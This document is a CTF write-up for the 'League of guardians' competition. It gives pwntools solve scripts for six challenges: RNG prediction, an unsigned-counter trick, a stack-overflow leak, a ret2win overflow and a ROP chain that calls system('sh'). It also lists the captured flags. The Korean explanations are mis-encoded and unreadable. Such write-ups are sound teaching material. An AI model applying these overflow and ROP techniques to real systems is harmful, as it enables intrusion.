League of guardians write-up.md
=
���̹� ������� 1�������� Ǭ  Ǯ���̴�.

Randomgame1(misc) 
-
 nc�� �����ϸ� ������������ �Ѵ�. ���̳ʸ��� ���̴ٷ� ��� rand�� ���� ����� win�� 9������ ���� �ؾ��Ѵ�. ��� �� �̱�� �ȴ�. rand���� �̱���� ��¼�� �����ϴٰ� �õ尡 �����ð����� �ٲ�� ���� �˾Ҵ�. 

�׷��� ���ð��� ������ 2�� ������� ù ��° ���ǿ��� ���� ���� ���� win�� �ϱ� ���� ��츦 �ľ��� �� �� �̰��ָ� flag�� ���� �� �ִ�.

`solve.py`
```python
from pwn import *

s = remote("52.79.210.195",9292)
s2 = remote("52.79.210.195",9292)

win_list = []

for i in range(0,10):
	s.sendlineafter(": ", "1")
	result=s.recvline()
	if result == "You win!\n":
		win_list.append("1")
	elif result == "You lose!\n":
		win_list.append("2")
	else: win_list.append("3")

for i in range(0,10):
	s2.sendlineafter(": ",win_list[i])
	s2.recvuntil("You win!\n\n")

log.success(s2.recvline())
```
`flag{YoU_R_V3ry_Lucky_GUY!@#$}`

**![](https://lh5.googleusercontent.com/q7EduuOmhIZLizW0dxuKq0uCN87HIR5eL-UReD_OeUHvCioHfmWVEi64-rKsEInR7jV_0-3upmmj69W7dfZhlwWtXUVd_F3erutuJAx1nO_8AisjZA2ve28LFvx6HN_XsGPiGGRz)**

pang(misc)
-
�� ������ �׳� pwntool�̳� ���̽� ������ �̿��ϸ� Ǯ���� �����̴�. random1 ���� ���� ���� �״�� �Է��ϰ� random2 ���� ���� input2��  �� �Է��ϰ� str(int(ran2[0].encode("hex"),16) * ran1)�� ���� input3�� �Է��ϸ� �÷��װ� ���´�.

`solve.py`
```python
from pwn import *

s = remote("52.79.210.195",13001)

s.recvuntil('ran1 : ')
ran1=str(s.recv(14))
s.recvuntil('input random!\n\n')
s.sendline(ran1)
s.recvuntil('ran2 : ')
ran2=str(s.recv(20))
s.recvuntil('input random2!\n\n')
s.sendline(ran2)

s.recv()
input3=str(int(ran2[0].encode("hex"),16) * float(ran1))[:14]
log.info(input3)
s.sendline(input3)
s.interactive()
```


Randomgame2(pwn)
-
Randomgame1�� ���� ��������� ���� pwnable�� ������ �������� pwn���� ���Դ�. ���̳ʸ��� ���̴ٷ� ���

**![](https://lh5.googleusercontent.com/t4wJeY9EiKzl3YFpCRix7_HWC0wnye0IE96gTPJVch8D8CSFs3NyspajrYQc1drG3CiLZGwMlSmwDq5SpVv963f6F_wcKKu44Cpq1ZCe8EE_X4fRanBVvuaFRSTYYGuSbC-QE56j)** 

������ ���� --v8�� �ǰ� �̱�� ++v8�� �ȴ�. �׸��� v8 > v10(-3���� �ʱ�ȭ �Ǿ�����)�̸� cat flag�� ���ش�. 
������ ���⼭ �ٽ��� v8�� 

**![](https://lh4.googleusercontent.com/oFO3vrLSeIoV5tgF7EjlooK_zY9vH2ElowMnlfSWm4XJw-V3tkgGtycSckMjsWGHynyHVPk6k0m3QPAcGr85hSJGnWm-8U6KV2FOFNHU4biXKyVokg5Li0MFAWdSrhI47JMG9Yev)**

unsigned�� ���� �Ǿ��ִ�. ������ �������� �ʴ´�. ���� ù ����Ʈ�� ���� ���� �Ǵ��ϱ� ������ -3���� Ŭ���� -4, -5, -6�̷��� �Ǿ�� �Ѵ�. ���� ���������� ���ӿ��� �� ���� �ȴ�. 

```python
from pwn import *

s = remote("52.78.156.241",4885)
s2 = remote("52.78.156.241",4885)

lose_list = []

for i in range(0,11):
	s.sendlineafter(": ", "1")
	result=s.recvline()
	if result == "You win!\n":
		lose_list.append("3")
	elif result == "You lose!\n":
		lose_list.append("1")
	else: lose_list.append("2")

for i in range(0,11):
	s2.sendlineafter(": ",lose_list[i])
	s2.recvuntil("You lose!\n\n")

log.success(s2.recvline())
```
`flag{ThATs_t0o_BAd_y0u_R_s0_uNLucky!@#$}`

**![](https://lh3.googleusercontent.com/7SUlNCZ93Hj9bvbLftWzme1NhVaCWPgoRAcEbU2e4Lb7cJ1frwL3_St_vsTLH15RppMzlnq52zRVSPSshjr4LHkgdJ4mgE3nUxVrPpfAAs_ZbhupBhY_y68HjEdL7wsSb2SGV2Bi)**

guess(pwn)
-
elf 64bit �����̴�. 


**![](https://lh3.googleusercontent.com/vLiNCMdRejXRccUGYdu-8wsoUoOwnK0SWHPXxZDu28rnUE2zjfhZSBb_ghvaB6FskO9avRGvb274SMLYY23pXAfU3T4ip7wU1RfKkt_sUsHfixc9CXhUrRIfAMP0Z6fUdYg1UsMd)**


�޸� ��ȣ ����� �̷��ϴ�.

**![](https://lh6.googleusercontent.com/PnE3-7HHBpG7k0CXH9gVTRmSetQAXWkrXJtkBtr-oMxqnl1kT32zIrWklVPbldhjPNWQgle29iQzuTY2yguiAKBewCy3FpMiNFvdd82d_LRRpbiSgAxshY1M7lil3iYT5Ir2-q_S)**


���̳ʸ��� ��� v6�̶�� ������ rand���� �־��ش�. �׸��� �� ���� �Է¹޴� ���� ������ system("/bin/sh")�� �������ش�. buf�� ��ġ�� rbp-0x20, v6������ ��ġ�� rbp-0x10�̴�. buf�� �ּҺ��� 0x1E��ŭ �Է��� ���� �� ������ �����÷ο츦 ���� "Nice to meet you %s"���� v6(rand)���� leak�� �� �ִ�.


`exploit.py`
```python
from pwn import *

s = process("./guess")
#context.log_level = 'debug'
s.recvuntil('Tell me your name')

payload = "A"*15

s.sendline(payload)
s.recvuntil("A"*15+"\n")
leak=int(u32(s.recv(4)))
print (leak)
s.recvuntil('Okay, can you guess the random number?\n')
s.send(str(leak))
s.interactive()
```


yourNAME(pwn)
-
elf 64bit �����̴�.

**![](https://lh4.googleusercontent.com/QvNUncstkqYiV7rw434ww0lgtrL8sa70f1luprMjugK3bUrT7I5kpz-y2uaSqtd1ux-cWPdKruMs3UHs-75YdYanzwpueu8Nc7PPyX_fMzpO2Bl4k67-wI1_mOZ3wmYX16f77zAr)**

�޸� ��ȣ����� �̷��ϴ�.


**![](https://lh6.googleusercontent.com/SCTbr3vyc1Sj1taF7wT8M9qhswYgo0aYVorKvjPHgK17Z8En912wM4w5YkuP3lRdmI1p-h09nB6Au7VrUorucXK1MSRREuRPaDKfwqWniISEX98OnIMEFZ0_Pd-I_Tl9yAEE3b3a)**


scanf���� overflow�� �߻��Ѵ�. �׸��� ���̳ʸ��� �� ����,


**![](https://lh5.googleusercontent.com/Ci3PNYMGNgRajSF1XWTosYk25c9Mwy1LUL55v6oIOdcPVYEniya88Q14oFAdsIUXhMtfsLt_8caOcKvAOa9tVauDj9NSpX6bEzvC2F4EYKE9uDQM73D4l8V67ISUVZd2B3i5-eYg)**

�̷� �Լ��� �ִ�. ���� if�� �����ϰ�

**![](https://lh6.googleusercontent.com/05KfovEsbj5EtXQcKq5sLQ2e4QbGoCVrWsVnF6bmeWghbTsdsewz0GbKjjsPZwIFr7okjByOfCWdD62Xvb5FprurEHQKopHy6UpwSuyWwxX-MgGQlO5uq-ARB19d3a8iN8IYtM9o)**

�� �ּҸ� �����ؼ� ret�� ������ �ȴ�. 

`exploit.py`
```python
from pwn import *

s = remote("52.78.156.241",14191)
context.log_level = 'debug'

pr = 0x004008c3
binsh = 0x004008F0
payload = "A"*40
payload += p64(0x400788) #oneshot

s.sendlineafter('What your name?\n',payload)
s.interactive()
```

dance(pwn)
-
elf 64bit�̴�. 

**![](https://lh3.googleusercontent.com/zqGxI6OzffXPvUUKKCcoj2K6pkDZWdDEaS2-jsrGwyY4fAx98GCxerYp3DPCDaS31beGovx_rDGosIEbI7yqZe_eU7kk3SUgAnI4MKtU5_c-iMSFO8Efyz51DSkgaYh-l_Bf-6Xz)**

NX�� Ȱ��ȭ �Ǿ��ִ�. 

���̴ٷ� �м��ϸ�, 1�� �޴��� 2�� �޴� scanf���� overflow�� �����ϴ�. �׸��� welldone �Լ����� system�Լ��� ���Ǿ���.

 ROP�� �� system���ڷ� �Ѱ� �� /bin/sh������  ���̳ʸ� �ȿ� �ִ� �ɺ��� fflush�� �ڿ� sh�κи� ����ϸ� �ȴ�. �׸��� prdi ������ ����ϸ� �� �ǰ�, gadget()�� �ִ� pop rdi, pop rbp, ret�� ����ؾ� �Ѵ�. 

`exploit.py`
```python
from pwn import *

s = process("./dance")

sh = 0x40046f
pprdi = 0x4008fa
system = 0x400760

s.recvuntil("4. exit\n")
s.sendline("1")
s.recvuntil("!\n")

payload = "wellwell"
payload += "A"*64
payload += p64(pprdi)
payload += p64(sh)
payload += p64(0)
payload += p64(system)

s.sendline(payload)
s.interactive()
```
